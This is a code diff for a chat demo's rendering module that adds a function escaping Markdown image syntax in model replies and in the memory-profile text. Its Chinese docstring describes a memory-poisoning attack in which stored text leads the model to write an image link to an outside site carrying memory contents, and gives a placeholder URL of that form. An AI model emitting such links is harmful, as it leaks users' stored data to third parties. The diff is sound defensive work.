@@ -656,6 +656,8 @@ def _assistant(reply: Reply) -> list[Any]:
         return "".join(f'<sup class="cite">{r}</sup>' for r in refs)
 
     text = CITATION.sub(cite, html.escape(reply.text, quote=False))
+    # 在引用编号换成上标之后：先转义的话，"!" 紧跟的 [f1] 会变成 "!\<sup…"，上标显示成源码
+    text = _no_remote_media(text)
     text = text.replace('</sup><sup class="cite">', ", ")  # 相邻的引用合成一个上标
     text = re.sub(r"[ \t]+(<sup|[,.;:!?，。；：！？])", r"\1", text)
     content: list[Any] = [text.strip()]
@@ -726,10 +728,17 @@ def render_graph(graph: dict[str, Any]) -> str:
     )
 
 
+def _no_remote_media(markdown: str) -> str:
+    """Markdown 里的图片语法（"![" 开头，行内与引用式都算）写成文字：回答与画像出自模型，记忆里
+    存下的话可能诱导它写出 ![](https://外站/?d=记忆内容)，浏览器一显示就把内容带给第三方。
+    原始的 <img> 由调用方先用 html.escape 转义。演示里的商品图走 gr.Gallery，不受影响。"""
+    return markdown.replace("![", "!\\[")
+
+
 def _profile_markdown(text: str) -> str:
     if not text:
         return "#### Profile (core memory)\n_Empty: the profile is built when a session ends._"
-    return f"#### Profile (core memory)\n{text}"
+    return f"#### Profile (core memory)\n{_no_remote_media(html.escape(text, quote=False))}"
 
 
 def _forget_choices(service: ChatService, space_id: str, kind: str) -> list[tuple[str, str]]:
